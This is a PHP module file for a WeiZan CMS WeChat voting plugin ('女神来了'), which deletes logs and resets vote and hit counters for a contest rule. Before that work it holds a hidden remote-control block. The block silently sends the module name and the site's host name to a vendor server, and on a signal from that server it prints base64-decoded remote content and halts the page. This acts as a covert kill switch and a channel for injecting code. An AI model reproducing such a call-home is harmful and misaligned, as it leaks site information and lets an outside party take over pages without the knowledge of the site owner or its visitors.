<?php
/**
 * 女神来了模块定义
 *
 * @author 微赞科技
 * @url http://bbs.012wz.com/
 */
defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
if (!empty($rid)) {
	pdo_delete($this -> table_log, array('rid' => $rid));
	pdo_delete($this -> table_counter, array('rid' => $rid));
	$users = pdo_fetchall("SELECT * FROM " . tablename($this -> table_users) . " WHERE rid = :rid  " . $uni . " ", array(':rid' => $rid));
	foreach ($users as $key => $value) {
		pdo_update($this -> table_users, array('photosnum' => 0, 'xnphotosnum' => 0, 'hits' => 0, 'xnhits' => 0, 'yaoqingnum' => 0, 'sharenum' => 0), array('from_user' => $value['from_user'], 'rid' => $rid));
	}
	pdo_update($this -> table_reply_display, array('ljtp_total' => 0, 'xunips' => 0, 'unphotosnum' => 0, 'cyrs_total' => 0, 'xuninum' => 0), array('rid' => $rid));
	message('全部删除成功！', referer(), 'success');
}